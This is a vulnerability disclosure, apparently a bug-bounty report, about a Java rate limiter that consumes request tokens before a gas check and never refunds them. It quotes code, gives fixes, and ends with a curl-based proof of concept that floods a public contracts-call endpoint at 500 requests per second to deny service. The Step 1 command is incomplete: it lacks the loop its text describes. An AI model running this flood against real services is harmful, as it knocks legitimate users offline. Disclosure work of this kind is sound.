### Title
Rate Token Consumed and Not Restored on Gas Limit Rejection â€” Unprivileged DoS via Token Leakage

### Summary
In `ThrottleManagerImpl.throttle()`, `rateLimitBucket.tryConsume(1)` is called unconditionally before the gas check. When `gasLimitBucket` is depleted, every subsequent request silently consumes a rate token and is then rejected â€” but the rate token is never restored. Because `restore()` only refunds gas tokens and is never called on `ThrottleException`, an unprivileged attacker can deplete the gas bucket and then continuously drain the rate bucket, starving legitimate users of both resources simultaneously.

### Finding Description
**Exact code path:**

`ThrottleManagerImpl.java`, `throttle()`, lines 38â€“42:
```java
if (!rateLimitBucket.tryConsume(1)) {           // rate token consumed here
    throw new ThrottleException(...);
} else if (!gasLimitBucket.tryConsume(...)) {   // gas check happens AFTER
    throw new ThrottleException(...);            // rate token already gone, never restored
}
```

`restore()` (lines 59â€“64) only adds tokens back to `gasLimitBucket`, never to `rateLimitBucket`:
```java
public void restore(long gas) {
    long tokens = throttleProperties.scaleGas(gas);
    if (tokens > 0) {
        gasLimitBucket.addTokens(tokens);   // rate bucket untouched
    }
}
```

`ContractController.call()` (lines 46â€“49) only calls `restore()` for `InvalidParametersException`, not for `ThrottleException`:
```java
} catch (InvalidParametersException e) {
    throttleManager.restore(request.getGas());
    throw e;
}
// ThrottleException propagates with no restore â€” rate token permanently lost
```

**Root cause:** The design assumes that a rate-token consumption is only meaningful when a request proceeds past the gas check. This assumption is violated: when gas is exhausted, rate tokens are consumed for every rejected request with no compensating refund path.

**Failed assumption:** The `else if` structure implies the two checks are symmetric guards, but they are not â€” only gas tokens have a restore mechanism, and only for a different exception type.

### Impact Explanation
Default configuration: `requestsPerSecond = 500`, `gasPerSecond = 7,500,000,000` (scaled to 750,000 bucket tokens), `gas` field minimum 21,000 (scaled to 2 tokens), maximum gas per request up to `maxGasLimit`. An attacker sending requests at the maximum gas value (15,000,000 â†’ 1,500 scaled tokens) exhausts the gas bucket in ~500 requests â€” exactly one second's worth of rate tokens. Once gas is depleted, every request from any client (attacker or legitimate user) consumes a rate token and is rejected. Legitimate users receive `GAS_PER_SECOND_LIMIT_EXCEEDED` errors while their rate quota is silently drained, preventing them from succeeding even after the gas bucket partially refills. Both buckets can be kept simultaneously depleted with a sustained 500 req/s flood, which is trivially achievable from a single machine.

### Likelihood Explanation
No authentication, no IP binding, no privileged access required â€” the `/api/v1/contracts/call` endpoint is public. The attacker needs only HTTP access and the ability to send ~500 POST requests per second with a high `gas` field. This is within reach of a single commodity machine or a small botnet. The attack is repeatable every second as buckets refill, making it a continuous, low-cost denial-of-service. No exploit code or special knowledge of the system internals is needed beyond reading the public API spec.

### Recommendation
1. **Reverse the check order**: check `gasLimitBucket` first. If gas is exhausted, reject immediately without consuming a rate token. Rate tokens should only be consumed when a request is admitted past all pre-execution gates.
2. **Add rate-token restoration**: if the gas check fails after a rate token has been consumed, call `rateLimitBucket.addTokens(1)` before throwing, mirroring the existing gas-restore pattern.
3. **Atomic dual-bucket probe**: use Bucket4j's `tryConsumeAndReturnRemaining` or a composite bucket so both limits are checked atomically before either token is committed.

### Proof of Concept
**Preconditions:** Mirror node running with default throttle config (`requestsPerSecond=500`, `gasPerSecond=7_500_000_000`). No authentication required.

**Step 1 â€” Deplete gas bucket** (500 requests, each with `gas=15000000`):
```bash

  curl -s -X POST http://<node>/api/v1/contracts/call \
    -H 'Content-Type: application/json' \
    -d '{"to":"0x000000000000000000000000000000000000dead","gas":15000000}' &

wait
```
After this burst, `gasLimitBucket` is at or near zero. All 500 rate tokens are also consumed.

**Step 2 â€” Sustain the drain** (repeat every second):
```bash

  for i in $(seq 1 500); do
    curl -s -X POST http://<node>/api/v1/contracts/call \
      -H 'Content-Type: application/json' \
      -d '{"to":"0x000000000000000000000000000000000000dead","gas":21000}' &
  done
  wait
  sleep 1

```
Each iteration: rate bucket refills to 500, attacker consumes all 500 tokens, each request hits the still-depleted gas bucket and is rejected â€” rate tokens are permanently lost. Legitimate users receive `429`/`ThrottleException` for the duration of the attack.

**Observable result:** Legitimate clients receive `"Gas per second rate limit exceeded"` or `"Requests per second rate limit exceeded"` continuously. No legitimate request succeeds while the attacker sustains 500 req/s.
